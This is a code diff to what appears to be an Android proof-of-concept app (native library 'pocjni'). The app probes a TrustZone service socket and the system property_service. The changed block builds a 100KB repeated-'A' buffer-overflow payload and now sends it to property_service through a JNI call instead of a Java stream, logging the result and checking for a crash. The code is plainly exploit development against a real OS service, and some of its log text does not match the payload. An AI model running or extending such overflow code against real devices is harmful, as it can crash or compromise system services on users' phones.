@@ -35,6 +35,7 @@ import java.lang.reflect.Method;
 import java.nio.charset.StandardCharsets;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.Date;
 import java.util.List;
 import java.util.Locale;
@@ -59,9 +60,10 @@ public class MainActivity extends AppCompatActivity {
     static {
         System.loadLibrary("pocjni");
     }
+
     public static native ParcelFileDescriptor nativeConnectSocket(IMinkSocketFd tzService, String path, int[] handleArr);
     public static native String nativeReadFile(String path);
-    public static native int nativeSendLongData(int fd, byte[] data, int len);
+    public static native int nativeSendLongData(ParcelFileDescriptor pfd, byte[] data, int len);
 
     private ServiceConnection tzConnection = new ServiceConnection() {
         @Override
@@ -423,25 +425,15 @@ public class MainActivity extends AppCompatActivity {
                 appendLog("[BOF] Failed to get FD for property_service");
                 return;
             }
-            java.io.FileDescriptor fdesc = pfd.getFileDescriptor();
-            if (fdesc == null || !fdesc.valid()) {
-                appendLog("[BOF] Invalid FD");
-                return;
-            }
-            int fd = fdesc.hashCode();
-            appendLog("[BOF] Sending 100KB of 'hello' to property_service via Java...");
-            OutputStream os = new FileOutputStream(fdesc);
-            byte[] payload = new byte[1024 * 100];
-            Arrays.fill(payload, (byte)'A');
-            byte[] pattern = "aaaaa".getBytes(StandardCharsets.UTF_8);
-            for (int i = 0; i < payload.length; i++) {
+            byte[] pattern = "AAAAAA".getBytes(StandardCharsets.UTF_8);
+            int totalSize = 1024 * 100;
+            byte[] payload = new byte[totalSize];
+            for (int i = 0; i < totalSize; i++) {
                 payload[i] = pattern[i % pattern.length];
             }
-            os.write(payload);
-            os.flush();
-            os.close();
-            appendLog("[BOF] Write completed. Check for crash.");
-;
+            appendLog("[BOF] Sending " + totalSize + " bytes of 'hellooo' pattern via JNI...");
+            int written = nativeSendLongData(pfd, payload, payload.length);
+            appendLog("[BOF] JNI write returned: " + written);
         } catch (Exception e) {
             appendLog("[BOF] Error: " + e.toString());
         } finally {
